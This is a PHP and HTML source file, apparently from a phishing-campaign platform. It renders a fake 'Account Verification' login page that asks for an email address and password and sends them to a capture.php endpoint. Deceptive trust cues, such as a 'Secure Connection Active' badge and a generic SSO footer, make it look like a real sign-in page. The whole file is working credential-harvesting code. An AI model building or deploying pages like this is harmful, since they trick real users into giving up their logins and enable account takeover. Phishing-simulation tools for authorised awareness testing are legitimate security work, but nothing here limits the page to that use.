<?php
require_once __DIR__ . "/../../config/db.php";

if (!isset($_GET['id']) || !is_numeric($_GET['id'])) {
    die("Invalid session context.");
}

$campaign_id = (int) $_GET['id'];
$stmt = $conn->prepare("SELECT landing_image FROM phishing_campaigns WHERE id = ?");
$stmt->bind_param("i", $campaign_id);
$stmt->execute();
$campaign = $stmt->get_result()->fetch_assoc();
$stmt->close();

if (!$campaign) {
    die("Session expired or invalid.");
}

$landing_img = $campaign['landing_image'] ?? '';
// Resolve image path
if (!empty($landing_img) && strpos($landing_img, 'http') !== 0) {
    $landing_img = "../../" . $landing_img;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Action Required | Security Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>

<body class="bg-[#f3f4f6] min-h-screen flex items-center justify-center p-4">
    <div class="max-w-[420px] w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
        <!-- Branding / Header Image -->
        <div class="h-48 w-full bg-gray-50 flex items-center justify-center overflow-hidden border-b border-gray-100">
            <?php if (!empty($landing_img)): ?>
                <img src="<?php echo htmlspecialchars($landing_img); ?>" alt="Banner" class="w-full h-full object-cover">
            <?php else: ?>
                <div class="flex flex-col items-center gap-2 opacity-20">
                    <span class="material-symbols-outlined text-6xl">account_circle</span>
                    <span class="font-bold text-xs uppercase tracking-widest">Security Gateway</span>
                </div>
            <?php endif; ?>
        </div>

        <!-- Form Area -->
        <div class="p-8">
            <div class="mb-6">
                <h1 class="text-xl font-bold text-gray-900 tracking-tight">Account Verification</h1>
                <p class="text-sm text-gray-500 mt-1">To protect your account, please verify your identity to continue.</p>
            </div>

            <form action="capture.php" method="POST" class="space-y-4">
                <input type="hidden" name="campaign_id" value="<?php echo $campaign_id; ?>">

                <div>
                    <label class="block text-[11px] font-bold text-gray-400 uppercase tracking-widest mb-1.5 px-1">Email Address</label>
                    <div class="relative">
                        <span class="material-symbols-outlined absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-lg">alternate_email</span>
                        <input type="email" required name="email"
                            class="w-full bg-gray-50 border border-gray-200 rounded-xl py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all font-medium text-gray-800"
                            placeholder="username@company.com">
                    </div>
                </div>

                <div>
                    <label class="block text-[11px] font-bold text-gray-400 uppercase tracking-widest mb-1.5 px-1">Password</label>
                    <div class="relative">
                        <span class="material-symbols-outlined absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 text-lg">key</span>
                        <input type="password" required name="password"
                            class="w-full bg-gray-50 border border-gray-200 rounded-xl py-2.5 pl-10 pr-4 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all font-medium text-gray-800"
                            placeholder="••••••••">
                    </div>
                </div>

                <div class="pt-2">
                    <button type="submit"
                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl shadow-lg shadow-blue-500/30 transition-all transform active:scale-[0.98]">
                        Confirm Identity
                    </button>
                    <p class="text-[10px] text-center text-gray-400 mt-4 leading-relaxed">
                        By clicking "Confirm Identity", you agree to our <a href="#" class="text-blue-500 hover:underline">Security Policy</a> and <a href="#" class="text-blue-500 hover:underline">Terms of Service</a>.
                    </p>
                </div>
            </form>
        </div>

        <div class="bg-gray-50 border-t border-gray-100 p-4 text-center">
            <div class="flex items-center justify-center gap-2 mb-1">
                <span class="material-symbols-outlined text-[#00a300] text-sm">enhanced_encryption</span>
                <span class="text-[10px] font-bold text-gray-500 uppercase tracking-widest">Secure Connection Active</span>
            </div>
            <p class="text-[9px] text-gray-400">© 2024 SSO Integrated Authentication Service</p>
        </div>
    </div>
</body>

</html>